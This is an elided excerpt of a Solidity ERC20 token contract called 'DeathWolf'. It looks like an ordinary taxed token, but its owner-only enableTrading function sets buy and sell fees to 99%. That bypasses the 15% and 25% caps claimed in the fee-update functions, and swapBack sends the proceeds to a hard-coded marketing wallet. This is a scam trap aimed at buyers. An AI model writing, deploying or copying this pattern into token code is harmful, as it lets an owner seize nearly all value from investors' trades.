...
contract DeathWolf is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public MKTG_DEV_CEXAddress;
    ...
    uint256 public buyMKTG_DEV_CEXFee;
    uint256 public buyLiquidityFee;
    uint256 public buyTotalFees;

    uint256 public sellBurnFee;
    uint256 public sellMKTG_DEV_CEXFee;
    ...
    uint256 public tokensForMKTG_DEV_CEX;
    ...
    constructor() ERC20("DeathWolf", "DTH") {
        ...
        uint256 _buyMKTG_DEV_CEXFee = 6;
        uint256 _buyLiquidityFee = 2;

        uint256 _sellBurnFee = 1;
        uint256 _sellMKTG_DEV_CEXFee = 6;
        ...
        swapTokensAtAmount = supply * 5 / 1000000; 
        maxWalletTotal = supply * maxWallet / 100;

        buyBurnFee = _buyBurnFee;
        buyMKTG_DEV_CEXFee = _buyMKTG_DEV_CEXFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyTotalFees = buyBurnFee + buyMKTG_DEV_CEXFee + buyLiquidityFee;

        sellBurnFee = _sellBurnFee;
        sellMKTG_DEV_CEXFee = _sellMKTG_DEV_CEXFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellTotalFees = sellBurnFee + sellMKTG_DEV_CEXFee + sellLiquidityFee;

        MKTG_DEV_CEXAddress = 0xbfE203e9De6b8D827d7De4aa418DD4c488078BFD;
    ...
    function enableTrading() external onlyOwner {
        buyBurnFee = 1;
        buyMKTG_DEV_CEXFee = 97;
        buyLiquidityFee = 1;
        buyTotalFees = buyBurnFee + buyMKTG_DEV_CEXFee + buyLiquidityFee;

        sellBurnFee = 1;
        sellMKTG_DEV_CEXFee = 97;
        sellLiquidityFee = 1;
        sellTotalFees = sellBurnFee + sellMKTG_DEV_CEXFee + sellLiquidityFee;

        walletTransferDelayTime = 60;
    ...
    function updateBuyFees(uint256 _burnFee, uint256 _MKTG_DEV_CEXFee, uint256 _buyLiquidityFee) external onlyOwner {
      require(!_renounceFeeFunctions, "Cannot update fees after renouncement");
        buyBurnFee = _burnFee;
        buyMKTG_DEV_CEXFee = _MKTG_DEV_CEXFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyTotalFees = buyBurnFee + buyMKTG_DEV_CEXFee + buyLiquidityFee;
        require(buyTotalFees <= (feeUnits/15), "Buy fees must be 15% or less");
    }

    function updateSellFees(uint256 _burnFee, uint256 _MKTG_DEV_CEXFee, uint256 _sellLiquidityFee) external onlyOwner {
      require(!_renounceFeeFunctions, "Cannot update fees after renouncement");
        sellBurnFee = _burnFee;
        sellMKTG_DEV_CEXFee = _MKTG_DEV_CEXFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellTotalFees = sellBurnFee + sellMKTG_DEV_CEXFee + sellLiquidityFee;
        require(sellTotalFees <= (feeUnits/25), "Sell fees must be 25% or less");
    }

    function updateMKTG_DEV_CEXAddress(address newWallet) external onlyOwner {
      require(!_renounceWalletChanges, "Cannot update wallet after renouncement");
        MKTG_DEV_CEXAddress = newWallet;
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            ...
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0){
                ...
                tokensForMKTG_DEV_CEX += fees * sellMKTG_DEV_CEXFee / sellTotalFees;
                if (liquidityFeeActive) {
            ...
            // on buy
                ...
                tokensForMKTG_DEV_CEX += fees * buyMKTG_DEV_CEXFee / buyTotalFees;
                if (liquidityFeeActive) {
    ...
    function swapBack() private {
        ...
        tokensForMKTG_DEV_CEX = 0;

        (success,) = address(MKTG_DEV_CEXAddress).call{value: address(this).balance}("");
    }
